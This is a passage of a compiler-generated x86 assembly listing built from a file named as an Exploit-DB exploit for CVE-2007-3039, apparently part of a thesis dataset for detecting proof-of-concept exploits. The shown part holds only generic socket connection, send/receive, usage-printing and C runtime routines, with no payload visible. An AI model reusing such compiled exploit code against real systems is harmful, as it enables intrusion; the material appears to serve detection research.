	mov	edx, DWORD PTR _s$[ebp]
	push	edx
	call	_send@16
; Line 402
	push	100					; 00000064H
	call	DWORD PTR __imp__Sleep@4
; Line 404
	push	6000					; 00001770H
	push	0
	lea	eax, DWORD PTR _buffer$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 405
	push	0
	push	5999					; 0000176fH
	lea	ecx, DWORD PTR _buffer$[ebp]
	push	ecx
	mov	edx, DWORD PTR _s$[ebp]
	push	edx
	call	_recv@16
	mov	DWORD PTR _ret$[ebp], eax
; Line 408
	mov	eax, DWORD PTR _s$[ebp]
	push	eax
	call	_Disconnect
	add	esp, 4
; Line 410
	xor	eax, eax
$LN25@main:
; Line 411
	mov	ecx, DWORD PTR __$ArrayPad$[ebp]
	xor	ecx, ebp
	call	@__security_check_cookie@4
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_tv$ = -300						; size = 8
_bf$ = -292						; size = 4
_i$ = -288						; size = 4
_s$ = -284						; size = 4
_wd$ = -280						; size = 260
_target$ = -20						; size = 16
__$ArrayPad$ = -4					; size = 4
_address$ = 8						; size = 4
_port$ = 12						; size = 4
_timeout$ = 16						; size = 4
_Make_Connection PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_4934_cve_id_CVE-2007-3039.c
; Line 197
	push	ebp
	mov	ebp, esp
	sub	esp, 300				; 0000012cH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	mov	DWORD PTR __$ArrayPad$[ebp], eax
; Line 205
	push	0
	push	1
	push	2
	call	_socket@12
	mov	DWORD PTR _s$[ebp], eax
; Line 206
	cmp	DWORD PTR _s$[ebp], 0
	jae	SHORT $LN5@Make_Conne
; Line 207
	or	eax, -1
	jmp	$LN1@Make_Conne
$LN5@Make_Conne:
; Line 209
	mov	eax, 2
	mov	WORD PTR _target$[ebp], ax
; Line 210
	mov	ecx, DWORD PTR _address$[ebp]
	push	ecx
	call	_inet_addr@4
	mov	DWORD PTR _target$[ebp+4], eax
; Line 211
	cmp	DWORD PTR _target$[ebp+4], 0
	jne	SHORT $LN6@Make_Conne
; Line 213
	mov	edx, DWORD PTR _s$[ebp]
	push	edx
	call	_closesocket@4
; Line 214
	mov	eax, -2					; fffffffeH
	jmp	$LN1@Make_Conne
$LN6@Make_Conne:
; Line 216
	movzx	eax, WORD PTR _port$[ebp]
	push	eax
	call	_htons@4
	mov	WORD PTR _target$[ebp+2], ax
; Line 217
	mov	DWORD PTR _bf$[ebp], 1
; Line 218
	lea	ecx, DWORD PTR _bf$[ebp]
	push	ecx
	push	-2147195266				; 8004667eH
	mov	edx, DWORD PTR _s$[ebp]
	push	edx
	call	_ioctlsocket@12
; Line 219
	mov	eax, DWORD PTR _timeout$[ebp]
	mov	DWORD PTR _tv$[ebp], eax
; Line 220
	mov	DWORD PTR _tv$[ebp+4], 0
; Line 221
	mov	DWORD PTR _wd$[ebp], 0
$LN4@Make_Conne:
; Line 222
	cmp	DWORD PTR _wd$[ebp], 64			; 00000040H
	jae	SHORT $LN2@Make_Conne
	mov	ecx, DWORD PTR _wd$[ebp]
	mov	edx, DWORD PTR _s$[ebp]
	mov	DWORD PTR _wd$[ebp+ecx*4+4], edx
	mov	eax, DWORD PTR _wd$[ebp]
	add	eax, 1
	mov	DWORD PTR _wd$[ebp], eax
$LN2@Make_Conne:
	xor	ecx, ecx
	jne	SHORT $LN4@Make_Conne
; Line 223
	push	16					; 00000010H
	lea	edx, DWORD PTR _target$[ebp]
	push	edx
	mov	eax, DWORD PTR _s$[ebp]
	push	eax
	call	_connect@12
; Line 224
	lea	ecx, DWORD PTR _tv$[ebp]
	push	ecx
	push	0
	lea	edx, DWORD PTR _wd$[ebp]
	push	edx
	push	0
	mov	eax, DWORD PTR _s$[ebp]
	add	eax, 1
	push	eax
	call	_select@20
	mov	DWORD PTR _i$[ebp], eax
	cmp	DWORD PTR _i$[ebp], -1
	jne	SHORT $LN8@Make_Conne
; Line 226
	mov	ecx, DWORD PTR _s$[ebp]
	push	ecx
	call	_closesocket@4
; Line 227
	mov	eax, -3					; fffffffdH
	jmp	$LN1@Make_Conne
$LN8@Make_Conne:
; Line 229
	cmp	DWORD PTR _i$[ebp], 0
	jne	SHORT $LN9@Make_Conne
; Line 231
	mov	edx, DWORD PTR _s$[ebp]
	push	edx
	call	_closesocket@4
; Line 232
	mov	eax, -4					; fffffffcH
	jmp	SHORT $LN1@Make_Conne
$LN9@Make_Conne:
; Line 234
	mov	DWORD PTR _i$[ebp], 4
; Line 235
	lea	eax, DWORD PTR _i$[ebp]
	push	eax
	lea	ecx, DWORD PTR _bf$[ebp]
	push	ecx
	push	4103					; 00001007H
	push	65535					; 0000ffffH
	mov	edx, DWORD PTR _s$[ebp]
	push	edx
	call	_getsockopt@20
; Line 236
	cmp	DWORD PTR _bf$[ebp], 0
	jne	SHORT $LN11@Make_Conne
	cmp	DWORD PTR _i$[ebp], 4
	je	SHORT $LN10@Make_Conne
$LN11@Make_Conne:
; Line 238
	mov	eax, DWORD PTR _s$[ebp]
	push	eax
	call	_closesocket@4
; Line 239
	mov	eax, -5					; fffffffbH
	jmp	SHORT $LN1@Make_Conne
$LN10@Make_Conne:
; Line 241
	lea	ecx, DWORD PTR _bf$[ebp]
	push	ecx
	push	-2147195266				; 8004667eH
	mov	edx, DWORD PTR _s$[ebp]
	push	edx
	call	_ioctlsocket@12
; Line 242
	mov	eax, DWORD PTR _s$[ebp]
$LN1@Make_Conne:
; Line 243
	mov	ecx, DWORD PTR __$ArrayPad$[ebp]
	xor	ecx, ebp
	call	@__security_check_cookie@4
	mov	esp, ebp
	pop	ebp
	ret	0
_Make_Connection ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_s$ = 8							; size = 4
_Disconnect PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_4934_cve_id_CVE-2007-3039.c
; Line 248
	push	ebp
	mov	ebp, esp
; Line 249
	mov	eax, DWORD PTR _s$[ebp]
	push	eax
	call	_closesocket@4
; Line 250
	call	_WSACleanup@0
; Line 251
	pop	ebp
	ret	0
_Disconnect ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_argv$ = 8						; size = 4
_usage	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_4934_cve_id_CVE-2007-3039.c
; Line 181
	push	ebp
	mov	ebp, esp
; Line 182
	mov	eax, DWORD PTR _argv$[ebp]
	push	eax
	push	OFFSET $SG98632
	call	_printf
	add	esp, 8
; Line 183
	mov	ecx, DWORD PTR _argv$[ebp]
	push	ecx
	push	OFFSET $SG98633
	call	_printf
	add	esp, 8
; Line 184
	push	1
	call	_exit
$LN2@usage:
; Line 185
	pop	ebp
	ret	0
_usage	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _fprintf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
_fprintf PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 837
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 840
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 841
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 842
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 843
	mov	eax, DWORD PTR __Result$[ebp]
; Line 844
	mov	esp, ebp
	pop	ebp
	ret	0
_fprintf ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
